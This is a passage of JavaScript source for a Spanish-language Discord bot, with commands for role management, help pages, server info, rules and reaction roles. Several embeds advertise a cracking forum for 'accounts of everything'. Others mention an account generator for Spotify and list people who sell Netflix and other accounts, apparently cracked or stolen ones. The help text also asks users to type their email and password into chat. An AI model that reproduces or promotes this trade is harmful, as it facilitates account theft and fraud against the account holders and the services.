    let miembro = message.mentions.members.first();
    let nombrerol = args.slice(1).join(" ");

    let role = message.guild.roles.find("name", nombrerol);
    let perms = message.member.hasPermission("MANAGE_ROLES_OR_PERMISSIONS");

    if (!perms)
      return message.channel.send(
        "`Error |` No tienes Permisos para usar este comando."
      );

    if (message.mentions.users.size < 1)
      return message.reply("Debe mencionar a un miembro.").catch(console.error);
    if (!nombrerol)
      return message.channel.send(
        "Escriba el nombre del rol a remover, `-removerol @miembro [rol]`"
      );
    if (!role) return message.channel.send("Rol no encontrado en el servidor.");

    miembro.removeRole(role).catch(console.error);
    message.channel.send(
      `El rol **${role.name}** del miembro **${miembro.user.username}** fue removido  correctamente.`
    );
  }

  if (message.content.startsWith(prefix + "invitame")) {
    const embed = new Discord.RichEmbed()
      .setTitle("Invite")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0x00ae86)
      .setDescription("Invitame a tu servidor con este link")
      .setThumbnail(
        "https://www.google.es/url?sa=i&rct=j&q=&esrc=s&source=images&cd=&cad=rja&uact=8&ved=2ahUKEwjJzNGt06LgAhWv34UKHcopArAQjRx6BAgBEAU&url=https%3A%2F%2Fgifer.com%2Fen%2FGqtd&psig=AOvVaw1JCWh7YlugZkPAH14IpsG3&ust=1549389376934307"
      )
      .setTimestamp()
      .addField(
        "Link de invitacion:",
        "[Link](https://discordapp.com/oauth2/authorize?client_id=581793105385226240&permissions=8&scope=bot)",
        true
      );

    message.channel.send({ embed });
  }

  if (message.content.startsWith(prefix + "donar")) {
    const embed = new Discord.RichEmbed()
      .setTitle("Donar")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0x00ae86)
      .setDescription("Si nos vas a donar muchas gracias. Lo tendremos en cuenta.")
      .setFooter("Version 2.2", "https://media.discordapp.net/attachments/513079562628890625/534111650866003988/MOSHED-2019-1-13-15-48-46.gif?width=300&height=300")
      .setThumbnail(message.author.avatarURL)
      .setTimestamp()
      .addField("Link para pagar", '[Aqui](https://paypal.me/papelabot)', true);

    message.channel.send({ embed });
  }

  if (message.content.startsWith(prefix + "foro")) {
    message.channel.send("**BETA DEL FORO**");
    const embed = new Discord.RichEmbed()
      .setTitle("Foro:")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0x00ae86)
      .setDescription("Unete a nuestro foro y encuentra cuentas de todo.")
      .setFooter("Version 2.2", "https://media.discordapp.net/attachments/513079562628890625/534111650866003988/MOSHED-2019-1-13-15-48-46.gif?width=300&height=300")
      .setThumbnail(
        "https://media.discordapp.net/attachments/513079562628890625/534111650866003988/MOSHED-2019-1-13-15-48-46.gif?width=300&height=300"
      )
      .setTimestamp()
      .addField("Foro", "[Link del foro](http://diozdelcrackingv2.epizy.com)", true);

    message.channel.send({ embed });
  }

  if (message.content.startsWith(prefix + "status")) {
    const embed = new Discord.RichEmbed()
      .setTitle("Estado:")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0x00ae86)
      .setDescription("Web para ver el estado del Bot y Foro.")
      .setFooter("Version 2.2", "https://media.discordapp.net/attachments/513079562628890625/534111650866003988/MOSHED-2019-1-13-15-48-46.gif?width=300&height=300")
      .setThumbnail(
        "https://media.discordapp.net/attachments/513079562628890625/534111650866003988/MOSHED-2019-1-13-15-48-46.gif?width=300&height=300"
      )
      .setTimestamp()
      .addField("Estado:", "[Link](https://diozdelcrackingv2.betteruptime.com/)", true);

    message.channel.send({ embed });
  }
  
  
  if (message.content.startsWith(prefix + "creador")) {
    const embed = new Discord.RichEmbed()
      .setTitle("@Papela#8062:")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0x00ae86)
      .setDescription(
        "Si teneis alguna duda, pregunta o idea no dudeis en contactar con migo @Papela#8062 o entrar en mi servidor"
      )
      .setFooter("Version 2.0", client.user.avatarURL)
      .setImage("https://i.gifer.com/Gqtd.gif")
      .setThumbnail(message.author.avatarURL)
      .setTimestamp()
      .setURL("https://github.com/CraterMaik")
      .addField(
        "Invitacion (XD)",
        "[Link de invitacion](https://discord.gg/jhxD3Zk)",
        true
      );

    message.channel.send({ embed });
  }

  if (message.content.startsWith(prefix + "horarios")) {
    message.channel.send("Ahora mismo estoy **24/7**:grinning: ");
  }

  if (message.content.startsWith(prefix + "ayuda")) {
    message.channel.send(
      "**" + message.author.username + "**, Revisa tus mensajes privados."
    );
    const embed = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .addField(
        prefix +"ping",
        "Compueba la latencia del BOT con la API de discord.",
        true
      )
      .addField(prefix +"info", "Muestra información del servidor", true)
      .addField(
        prefix +"borrar y la cantidad",
        "Borra los mensajes que allan escrito (Solo con permisos)"
      )
      .addField(
        "Invitacion (XD)",
        "[Link de invitacion](https://discord.gg/cxjv6WF)",
        true
      )
      .addField("Pagina 2", "abajo", true)
      .setFooter(
        "Version 2.2     hay + comandos si quieres descubrirlos contacta con @Papela#8062 ",
        client.user.avatarURL
      )
      .setColor(0xaafb00);

    message.author.send({ embed });
  }

  if (message.content.startsWith(prefix + "ayuda")) {
    const embed = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .addField("Pagina 2", "Apatir de aqui", true)
      .addField(
        "horarios",
        "para ver el bot que horas esta online escribe .xd.horarios",
        true
      )
      .addField(
        "Cuentas",
        "hay comandos donde el bot da cuentas. Como por ejemplo .xd.gen spotify"
      )
      .addField("Prefix", "El prefix de este bot  por defecto es **.xd.** y el que tu tienes puesto es: **" + prefix + "**", true)
      .addField("Pagina 3", "abajo", true)
      .setFooter(
        "Version 2.2     hay + comandos si quieres descubrirlos contacta con @Papela#8062 ",
        client.user.avatarURL
      )
      .setColor(0xaafb00);

    message.author.send({ embed });
  }

  if (message.content.startsWith(prefix + "ayuda")) {
    const embed = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .addField("Pagina 3", "Apatir de aqui", true)
      .addField(
        "Donar",
        "Para donarnos escribe .xd.donar Si nos donas muchas gracias."
      )
      .addField(
        "Foro",
        "Escribe .xd.foro para ver nuestro foro de cuentas",
        true
      )
      .addField(
        "Mas comandos",
        "Para ver mas comandos escribe a @Papela#8062",
        true
      )
      .addField("Pagina 4", "abajo", true)
      .setFooter(
        "Version 2.2     hay + comandos si quieres descubrirlos contacta con @Papela#8062 ",
        client.user.avatarURL
      )
      .setColor(0xaafb00);

    message.author.send({ embed });
  }

  if (message.content.startsWith(prefix + "ayuda")) {
    const embed = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .addField("Pagina 4", "Apatir de aqui", true)
      .addField(
        "Musica",
        " Para escuchar musica de yt escribe: .xd.ytplay y el link"
      )
      .addField("Musica(Broma)", "Escribe .xd.gemi2", true)
      .addField(
        "Entar y salir",
        "Para que se una a tu canal de voz escribe .xd.unete o .xd.salir",
        true
      )
      .addField("Pagina 5", "Abajo", true)
      .setFooter(
        "Version 2.2     hay + comandos si quieres descubrirlos contacta con @Papela#8062 ",
        client.user.avatarURL
      )
      .setColor(0xaafb00);

    message.author.send({ embed });
  }

  if (message.content.startsWith(prefix + "ayuda")) {
    const embed = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .addField("Pagina 5", "Apatir de aqui", true)
      .addField(
        "Votaciones",
        "Para crear votaciones escribe esto: Uso correto: .xd.votacion <titulo> y la pregunta?"
      )
      .addField("Buesqueda YT", "Escribe .xd.ytsearch y el nombre del video", true)
      .addField(
        "Login",
        "Para logearte escribe /login tucorreo tucontraseña",
        true
      )
      .addField("Pagina 6", "Abajo", true)
      .setFooter(
        "Version 2.2     hay + comandos si quieres descubrirlos contacta con @Papela#8062 ",
        client.user.avatarURL
      )
      .setColor(0xaafb00);

    message.author.send({ embed });
  }
  
  if (message.content.startsWith(prefix + "ayuda")) {
    const embed = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .addField("Pagina 6", "Apatir de aqui", true)
      .addField(
        "Gif",
        "Para enviar gifs escribe: .xd.gif y de que quieres q sea el gif"
      )
      .addField("Moderacion", "Hay comandos como .xd.añadirol, .xd.removerol, .xd.banear, .xd.expulsar...", true)
      .addField(
        "Login",
        "Para logearte escribe /login tucorreo tucontraseña",
        true
      )
      .addField("Pagina 7", "Pronto", true)
      .setFooter(
        "Version 2.2     hay + comandos si quieres descubrirlos contacta con @Papela#8062 ",
        client.user.avatarURL
      )
      .setColor(0xaafb00);

    message.author.send({ embed });
  }
  
  
  
  var server = message.guild;
  if (message.content.startsWith(prefix + "info")) {
    const embed = new Discord.RichEmbed()
      .setThumbnail(server.iconURL)
      .setAuthor(server.name, server.iconURL)
      .addField("ID", server.id, true)
      .addField("Region", server.region, true)
      .addField("Creado el", server.joinedAt.toDateString(), true)
      .addField(
        "Dueño del Servidor",
        server.owner.user.tag + "(" + server.owner.user.id + ")",
        true
      )
      .addField("Miembros", server.memberCount, true)
      .addField("Roles", server.roles.size, true)
      .setColor(0xaafb00);

    message.channel.send({ embed });
  }

  if (message.content.startsWith(prefix + "reglas")) {
    const embed = new Discord.RichEmbed()
      .setTitle("Reglas")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0xaafb00)
      .setDescription(
        "Estas son las reglas a seguir quien no las cumpla tendra stikes y con 2 strikes seras baneado."
      )
      .setFooter("Pie de página.", client.user.avatarURL)
      .setImage("https://i.gifer.com/Gqtd.gif")
      .setThumbnail(message.author.avatarURL)
      .setTimestamp()
      .setURL("https://github.com/Papela")
      .addField(
        "Insultos",
        "Estan prohibidos los inultos cualquier inuslto puede ser motivo de strike."
      )
      .addField(
        "Spam",
        "Esta prohibido todo tipo de spam cualquier tipo de spam sera un ban"
      )
      .addBlankField(true)
      .addField("Si teneis alguna otra duda no dudeis en contactar con Papela");

    message.channel.send({ embed });
  }

  if (message.content.startsWith(prefix + "cuentas")) {
    const embed = new Discord.RichEmbed()
      .setTitle(" Cuentas:")
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(0xaafb00)
      .setDescription("Estas son las personas que venden cuentas.")
      .setFooter("Pie de página.", client.user.avatarURL)
      .setImage("https://i.gifer.com/Gqtd.gif")
      .setThumbnail(message.author.avatarURL)
      .setTimestamp()
      .setURL("https://github.com/CraterMaik")
      .addField(
        "@Papela#9411",
        "Vende cuentas de todo tipo a un buen precio si quereis contactar con el por privado."
      )
      .addField(
        "RaresDaniel ",
        "Vende cuentas de Netflix. Si quereis alguna contactar con el"
      )
      .addBlankField(true)
      .addField("Proximamente", "Proximamente");
    message.channel.send({ embed });
  }

  
  
  //BETA

  //BETA
});

client.login(process.env.TOKEN);

//reaction
//role

//Settings!

const yourID = "529736520048050189"; //Instructions on how to get this: https://redd.it/40zgse

const setupCMD = ".xd.proiecto6";

let initialMessage =
  "**Si quieres ser el nuevo programador, moderador,Jeffe del server... Reaciona abajo y ve al canal de <#613743206500270081> a rellenar el formulario.** ``Pero si no vas a estar reviviendo el server ni te molestes en entrar.``";
("//**Reaciona el mensaje para conseguir el rol");
const roles = ["⚠🚧-proyecto-6🚧⚠"]; // ["hola", "admin"]

const reactions = ["💻"]; //["💻", "😃"]

const botToken =process.env.TOKEN; /*You'll have to set this yourself; read more



                     here https://github.com/reactiflux/discord-irc/wiki/Creating-a-discord-bot-&-getting-a-token*/

//Load up the bot...

const bot = new Discord.Client();

bot.login(botToken);

//If there isn't a reaction for every role, scold the user!

if (roles.length !== reactions.length)
  throw "la lista de roles y la lista de reaciones no tienen la misma longitud";

//Function to generate the role messages, based on your settings

function generateMessages() {
  var messages = [];

  messages.push(initialMessage);

  for (let role of roles)
    messages.push(`Reaciona para tener el rol: **"${role}"**`); //DONT CHANGE THIS

  return messages;
}

bot.on("message", message => {
  if (
    message.author.id == yourID &&
    message.content.toLowerCase() == setupCMD
  ) {
    message.channel.bulkDelete(1);

    var toSend = generateMessages();

    let mappedArray = [
      [toSend[0], false],
      ...toSend.slice(1).map((message, idx) => [message, reactions[idx]])
    ];

    for (let mapObj of mappedArray) {
      message.channel.send(mapObj[0]).then(sent => {
        if (mapObj[1]) {
          sent.react(mapObj[1]);
        }
      });
    }
  }
});

bot.on("raw", event => {
  if (
    event.t === "MESSAGE_REACTION_ADD" ||
    event.t == "MESSAGE_REACTION_REMOVE"
  ) {
    let channel = bot.channels.get(event.d.channel_id);

    let message = channel.fetchMessage(event.d.message_id).then(msg => {
      let user = msg.guild.members.get(event.d.user_id);

      if (msg.author.id == bot.user.id && msg.content != initialMessage) {
        var re = `\\*\\*"(.+)?(?="\\*\\*)`;

        var role = msg.content.match(re)[1];

        if (user.id != bot.user.id) {
          var roleObj = msg.guild.roles.find(r => r.name === role);

          var memberObj = msg.guild.members.get(user.id);

          if (event.t === "MESSAGE_REACTION_ADD") {
            memberObj.addRole(roleObj);
          } else {
            memberObj.removeRole(roleObj);
          }
        }
      }
    });
  }
});

//reaction
//role

